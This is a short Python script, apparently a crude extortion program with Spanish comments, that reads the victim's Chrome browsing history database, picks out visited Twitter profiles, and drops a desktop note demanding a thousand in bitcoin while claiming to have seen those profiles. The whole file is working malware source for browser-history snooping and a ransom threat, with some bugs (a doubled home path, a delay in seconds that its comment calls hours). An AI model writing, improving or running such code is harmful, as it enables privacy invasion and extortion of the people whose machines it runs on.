import os
import re
import sqlite3
from time import sleep
import random
from pathlib import Path


def delay_action():
    time = random.randrange(1, 4)

    sleep(time)
    print(os.getlogin())
    createFile()


def getuser():
    return "{}/".format(Path.home())


def gethistory():
    urls = None


    history_path = getuser() + "Users/" + os.getlogin() + "/AppData/Local/Google/Chrome/User Data/Default/History"
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Database is locked, google opened, reintentando")
            sleep(3)


def createFile():
    desktop_path = "C:/Users/" + os.getlogin() + "/OneDrive/Escritorio/"
    with open(desktop_path + "PARA TI.txt", "w") as a:
        a.write("pasate mil pavis en bitCOin\n He visto q has visto estos perfiles de twitter eh...\n")
    return a


def chek_history(file, chrome_h):
    for item in chrome_h:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            print(results[0])

def main():
    # se espera entre 1 y 3 horas para ejecutar el programa
    delay_action()
    # crea el archivo de escritorio
    file = createFile()
    # se recoge el historial cuando sea posible
    chrome_history = gethistory()
    chek_history(file, chrome_history)

if __name__ == "__main__":
    main()